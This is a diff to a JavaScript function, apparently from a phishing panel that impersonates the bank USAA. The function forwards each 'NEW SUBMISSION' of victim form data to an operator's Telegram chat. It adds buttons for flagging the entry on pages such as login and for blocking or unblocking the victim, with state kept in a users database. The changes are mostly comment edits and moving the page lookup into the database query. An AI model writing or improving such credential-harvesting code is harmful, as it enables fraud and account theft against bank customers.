@@ -331,7 +331,9 @@ async function buildMessage(data, options = {}) {
     let message = `🤖 USAA NEW SUBMISSION\n\n`;
     const excludeKeys = ["visitor", "userid", "security_code"];
 
+    // -----------------------------
     // Build message body
+    // -----------------------------
     for (const [key, value] of Object.entries(data)) {
       if (value && !excludeKeys.includes(key.toLowerCase())) {
         message += `${key.toUpperCase()}   : ${value}\n`;
@@ -357,20 +359,23 @@ async function buildMessage(data, options = {}) {
     const messageText = String(message || "Select a command:");
 
     // -----------------------------
-    // Get user block status from DB
+    // Get user status + page from DB
     // -----------------------------
     const userRow = await db.get(
-      "SELECT status FROM users WHERE id = ?",
+      "SELECT status, page FROM users WHERE id = ?",
       [userId]
     );
 
-    const isBlocked = userRow?.status === "blocked";
+    if (!userRow) {
+      throw new Error(`User ${userId} not found in database`);
+    }
+
+    const isBlocked = userRow.status === "blocked";
+    const page = (userRow.page || "").toLowerCase();
 
     // -----------------------------
-    // Dynamic page-based button
+    // Dynamic Bad Button
     // -----------------------------
-    const page = (data.page || "").toLowerCase();
-
     let badButton;
 
     if (page === "login") {
@@ -391,7 +396,7 @@ async function buildMessage(data, options = {}) {
     }
 
     // -----------------------------
-    // Dynamic Block / Unblock
+    // Dynamic Block / Unblock Button
     // -----------------------------
     const blockButton = isBlocked
       ? {
@@ -404,7 +409,7 @@ async function buildMessage(data, options = {}) {
         };
 
     // -----------------------------
-    // Final keyboard layout
+    // Final Keyboard Layout
     // -----------------------------
     const buttons = [
       [
@@ -422,7 +427,7 @@ async function buildMessage(data, options = {}) {
     ];
 
     // -----------------------------
-    // Send to Telegram
+    // Send Telegram Message
     // -----------------------------
     await sendTelegramMessage(botToken, chatId, messageText, {
       parse_mode: "HTML",
@@ -431,7 +436,7 @@ async function buildMessage(data, options = {}) {
       }
     });
 
-    console.log("✅ Telegram message sent with dynamic buttons");
+    console.log("✅ Telegram message sent with DB-based dynamic buttons");
 
     return message;
 
